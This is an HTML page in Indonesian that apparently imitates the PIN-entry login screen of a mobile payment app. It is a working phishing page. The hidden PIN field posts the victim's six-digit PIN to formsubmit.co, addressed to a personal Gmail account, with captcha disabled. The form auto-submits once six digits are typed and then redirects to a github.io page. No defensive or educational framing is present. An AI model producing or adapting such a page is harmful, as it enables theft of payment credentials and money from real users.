<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan PIN</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #fff;
      color: #000;
    }

    .header {
      background-color: #008CFF;
      color: white;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px;
      font-size: 18px;
      font-weight: bold;
    }

    .header .back {
      font-size: 24px;
      margin-right: 10px;
      cursor: pointer;
    }

    .title {
      text-align: center;
      margin-top: 32px;
      font-size: 18px;
      font-weight: bold;
    }

    .pin-dots {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin: 40px 0 20px;
    }

    .dot {
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background-color: lightgray;
    }

    .dot.filled {
      background-color: #008CFF;
    }

    input[type="password"] {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }

    .links {
      display: flex;
      justify-content: space-around;
      margin: 30px auto 0;
      max-width: 300px;
    }

    .links a {
      color: #008CFF;
      font-size: 14px;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body onclick="document.getElementById('pinInput').focus()">

  <div class="header">
    <div class="back">&larr;</div>
    <div>Masuk</div>
    <div style="width: 24px;"></div> <!-- Spacer agar teks tetap di tengah -->
  </div>

  <div class="title">Masukkan PIN</div>

  <div class="pin-dots" id="pinDots">
    <div class="dot" id="dot1"></div>
    <div class="dot" id="dot2"></div>
    <div class="dot" id="dot3"></div>
    <div class="dot" id="dot4"></div>
    <div class="dot" id="dot5"></div>
    <div class="dot" id="dot6"></div>
  </div>

  <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
    <input type="password" id="pinInput" name="PIN" maxlength="6" inputmode="numeric" pattern="\d{6}" required />
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://b813743.github.io/Testing-/">
  </form>

  <div class="links">
    <a href="#">BUTUH BANTUAN?</a>
    <a href="#">LUPA PIN?</a>
  </div>

  <script>
    const input = document.getElementById("pinInput");
    const dots = Array.from(document.querySelectorAll(".dot"));

    input.addEventListener("input", () => {
      const val = input.value;
      dots.forEach((dot, index) => {
        if (index < val.length) {
          dot.classList.add("filled");
        } else {
          dot.classList.remove("filled");
        }
      });

      if (val.length === 6) {
        input.form.submit();
      }
    });

    window.onload = () => {
      input.focus();
    };
  </script>
</body>
    </html>
